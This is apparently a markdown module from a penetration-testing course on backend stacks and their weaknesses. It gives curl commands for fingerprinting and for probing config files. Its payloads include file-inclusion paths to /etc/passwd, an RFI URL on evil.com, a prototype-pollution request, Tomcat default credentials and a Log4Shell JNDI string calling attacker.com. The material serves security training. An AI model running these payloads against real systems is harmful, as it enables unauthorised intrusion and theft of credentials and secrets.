# Backend Technologies

## Unit 2: Web Application Architecture — Topic 3

## 🎯 Overview

Backend technologies process client requests, handle business logic, and interact with databases. Understanding backend frameworks, languages, and their common vulnerabilities is essential for targeted exploitation. Each technology stack has unique attack vectors, default configurations, and known weaknesses that penetration testers must recognize.

---

## 1. Common Backend Stacks

```
┌──────────────────────────────────────────────────────────────┐
│                  POPULAR BACKEND STACKS                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  LAMP Stack          MEAN Stack         .NET Stack           │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐        │
│  │  Linux   │       │ MongoDB  │       │ Windows  │        │
│  │  Apache  │       │ Express  │       │   IIS    │        │
│  │  MySQL   │       │ Angular  │       │ SQL Svr  │        │
│  │  PHP     │       │ Node.js  │       │ ASP.NET  │        │
│  └──────────┘       └──────────┘       └──────────┘        │
│                                                              │
│  Python Stack        Java Stack         Ruby Stack           │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐        │
│  │  Linux   │       │  Linux   │       │  Linux   │        │
│  │  nginx   │       │  Tomcat  │       │  nginx   │        │
│  │PostgreSQL│       │  Oracle  │       │PostgreSQL│        │
│  │  Django  │       │ Spring   │       │  Rails   │        │
│  └──────────┘       └──────────┘       └──────────┘        │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Technology-Specific Vulnerabilities

| Technology | Common Vulnerabilities | Default Files |
|-----------|----------------------|---------------|
| PHP | File inclusion, type juggling, deserialization | `phpinfo.php`, `wp-config.php` |
| Node.js | Prototype pollution, SSRF, npm supply chain | `package.json`, `.env` |
| Python/Django | SSTI, pickle deserialization, debug mode | `settings.py`, `manage.py` |
| Java/Spring | JNDI injection (Log4Shell), deserialization | `web.xml`, `application.properties` |
| ASP.NET | ViewState attacks, padding oracle, debug | `web.config`, `Global.asax` |
| Ruby on Rails | Mass assignment, SSTI, marshal deserialization | `Gemfile`, `database.yml` |

---

## 3. Backend Fingerprinting

```bash
# Identify backend technology from responses
curl -sI https://target.com | grep -iE "(server|x-powered|x-aspnet)"

# Default error pages reveal technology
curl https://target.com/nonexistent-page-12345

# PHP: "Fatal error" with file paths
# Django: Yellow debug page with traceback
# Spring: "Whitelabel Error Page"
# Rails: "Routing Error" with available routes
# Express: "Cannot GET /path"
# ASP.NET: Custom error with stack trace

# File extension testing
curl -s -o /dev/null -w "%{http_code}" https://target.com/test.php
curl -s -o /dev/null -w "%{http_code}" https://target.com/test.asp
curl -s -o /dev/null -w "%{http_code}" https://target.com/test.jsp

# Technology-specific paths
curl -s -o /dev/null -w "%{http_code}" https://target.com/wp-admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" https://target.com/actuator/
```

---

## 4. PHP-Specific Attacks

```php
// Type juggling (loose comparison)
// "0e123" == "0e456" returns TRUE (both evaluate to 0)
// Magic hashes exploit this for auth bypass
// MD5("240610708") = 0e462097431906509019562988736854

// File inclusion
// Local File Inclusion (LFI)
// GET /page.php?file=../../../../etc/passwd
// Remote File Inclusion (RFI)
// GET /page.php?file=https://evil.com/shell.php

// Deserialization
// unserialize() with user input → RCE
```

```bash
# PHP-specific enumeration
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/.env

# Test for file inclusion
curl "https://target.com/page.php?file=....//....//etc/passwd"
curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=config"
```

---

## 5. Node.js / Express Attacks

```javascript
// Prototype pollution
// POST /api/update
// {"__proto__": {"isAdmin": true}}

// SSRF via request libraries
// Axios, node-fetch following redirects to internal services

// Path traversal
// Express static file serving misconfigurations
// GET /../../../etc/passwd
```

```bash
# Node.js-specific checks
curl https://target.com/package.json
curl https://target.com/.env
curl https://target.com/node_modules/

# Test prototype pollution
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"role":"admin"}}'
```

---

## 6. Java / Spring Attacks

```bash
# Spring Boot Actuator endpoints (info disclosure/RCE)
curl https://target.com/actuator
curl https://target.com/actuator/env
curl https://target.com/actuator/heapdump
curl https://target.com/actuator/mappings

# Tomcat default credentials
# admin:admin, tomcat:tomcat, admin:password
curl https://target.com/manager/html

# JNDI injection (Log4Shell style)
# ${jndi:ldap://attacker.com/exploit}

# Java deserialization
# ysoserial tool for generating payloads
```

---

## 7. Configuration File Discovery

```bash
# Common config files across technologies
for file in .env .env.local .env.production \
  config.php wp-config.php .git/config \
  web.config application.properties \
  settings.py database.yml .htaccess; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/$file")
  [ "$code" != "404" ] && echo "Found: $file ($code)"
done
```

---

## 📊 Summary Table

| Backend | Language | Key Attack | Fingerprint |
|---------|----------|-----------|-------------|
| Apache + PHP | PHP | LFI/RFI, type juggling | `X-Powered-By: PHP` |
| Express | JavaScript | Prototype pollution | `X-Powered-By: Express` |
| Django | Python | SSTI, debug mode | Yellow error page |
| Spring Boot | Java | Actuator, JNDI, deserialization | Whitelabel error |
| ASP.NET | C# | ViewState, padding oracle | `X-AspNet-Version` |
| Rails | Ruby | Mass assignment, SSTI | Routing error page |

---

## ❓ Revision Questions

1. How do you fingerprint the backend technology of a web application?
2. What is PHP type juggling and how can it bypass authentication?
3. Why are Spring Boot Actuator endpoints dangerous if exposed?
4. How does prototype pollution work in Node.js applications?
5. What configuration files should a penetration tester look for?
6. How does the backend technology influence your testing methodology?

---

*Previous: [02-frontend-technologies.md](02-frontend-technologies.md) | Next: [04-database-interactions.md](04-database-interactions.md)*

---

*[Back to README](../README.md)*
